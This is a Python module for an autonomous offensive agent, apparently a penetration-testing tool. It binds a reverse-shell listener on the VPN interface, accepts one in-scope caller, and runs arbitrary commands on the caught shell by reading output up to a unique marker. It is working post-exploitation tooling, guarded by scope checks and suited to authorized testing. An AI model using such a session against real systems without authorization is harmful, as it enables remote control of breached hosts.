"""Persistent foothold session for the offensive agent. Holds ONE live session
(a caught reverse shell today; SSH is a sibling entrypoint) so the agent can run
commands across its stateless steps. Stdlib-only; never raises.

The reverse-shell listener binds the VPN interface only. session_exec sends
`<cmd>; echo <marker>` and reads until the unique marker, so it knows when a
command's output ends without a real PTY prompt."""
from __future__ import annotations
import atexit
import re
import socket
import subprocess
import threading
import time
import uuid

_LOCK = threading.Lock()
_S: dict = {"status": "down", "kind": None, "conn": None, "peer": None,
            "listener": None, "log": []}
_ATEXIT_DONE = False


def _tun_ip(iface: str = "tun0") -> str | None:
    """The IPv4 of the VPN interface — the only address the listener binds."""
    try:
        out = subprocess.run(["ip", "-4", "-o", "addr", "show", iface],
                             capture_output=True, text=True, timeout=5).stdout
    except Exception:
        return None
    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
    return m.group(1) if m else None


def status() -> dict:
    with _LOCK:
        return {"status": _S["status"], "kind": _S["kind"], "peer": _S["peer"],
                "log_tail": "\n".join(_S["log"][-6:])}


def is_active() -> bool:
    with _LOCK:
        return _S["conn"] is not None


def _log(msg: str) -> None:
    _S["log"].append(msg)
    _S["log"] = _S["log"][-50:]


def _ensure_atexit() -> None:
    global _ATEXIT_DONE
    if not _ATEXIT_DONE:
        atexit.register(close)
        _ATEXIT_DONE = True


def _accept(lsock, scope) -> None:
    try:
        lsock.settimeout(180)
        conn, addr = lsock.accept()
    except Exception:
        with _LOCK:
            if _S["status"] == "listening":
                _S["status"] = "timeout"
        return
    peer = addr[0]
    if scope is not None:
        from atpt.scope import in_scope
        if not in_scope(scope, peer):
            try:
                conn.close()
            except Exception:
                pass
            with _LOCK:
                _S["status"] = "rejected"
                _log(f"rejected out-of-scope caller {peer}")
            return
    with _LOCK:
        _S.update(conn=conn, peer=peer, kind="revshell", status="connected")
        _log(f"caught reverse shell from {peer}")


def start_listener(port: int, scope=None, bind_ip: str | None = None) -> dict:
    """Bind a reverse-shell listener on the VPN interface and accept ONE caller
    (verified in scope) in the background. Returns the bound host:port."""
    _ensure_atexit()
    ip = bind_ip or _tun_ip()
    if not ip:
        return {"ok": False, "error": "no VPN (tun0) address; bring the tunnel up first"}
    try:
        lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        lsock.bind((ip, int(port)))
        lsock.listen(1)
    except Exception as exc:
        return {"ok": False, "error": f"bind {ip}:{port} failed: {exc}"}
    bound_port = lsock.getsockname()[1]
    with _LOCK:
        _S.update(listener=lsock, status="listening", kind=None, conn=None, peer=None)
        _log(f"listening on {ip}:{bound_port}")
    threading.Thread(target=_accept, args=(lsock, scope), daemon=True).start()
    return {"ok": True, "listen": f"{ip}:{bound_port}", "host": ip, "port": bound_port,
            "status": "listening"}


def wait_caught(timeout: float = 60) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        with _LOCK:
            st = _S["status"]
        if st == "connected":
            return True
        if st in ("rejected", "timeout", "down"):
            return False
        time.sleep(0.3)
    return False


def session_exec(cmd: str, timeout: float = 60) -> str:
    """Run one command in the held session, returning its output (marker-framed)."""
    with _LOCK:
        conn = _S["conn"]
    if conn is None:
        return "[session] no active session"
    marker = f"__ATPT_{uuid.uuid4().hex[:12]}__"
    try:
        conn.sendall((cmd + f"; echo {marker}\n").encode())
    except Exception as exc:
        return f"[session] send failed: {exc}"
    conn.setblocking(False)
    out, mk = b"", marker.encode()
    deadline = time.monotonic() + timeout
    try:
        while time.monotonic() < deadline:
            try:
                d = conn.recv(4096)
                if d:
                    out += d
                    if mk in out:
                        break
                else:
                    time.sleep(0.05)
            except BlockingIOError:
                time.sleep(0.05)
            except Exception as exc:
                return f"[session] recv failed: {exc}"
    finally:
        try:
            conn.setblocking(True)
        except Exception:
            pass
    text = out.decode(errors="replace")
    idx = text.find(marker)
    if idx >= 0:
        text = text[:idx]
    # drop a leading echo of our own command line, keep the output
    return text.replace(f"; echo {marker}", "").strip()


def close() -> dict:
    with _LOCK:
        for key in ("conn", "listener"):
            s = _S.get(key)
            if s:
                try:
                    s.close()
                except Exception:
                    pass
        _S.update(status="down", kind=None, conn=None, peer=None, listener=None)
    return {"ok": True, "status": "down"}
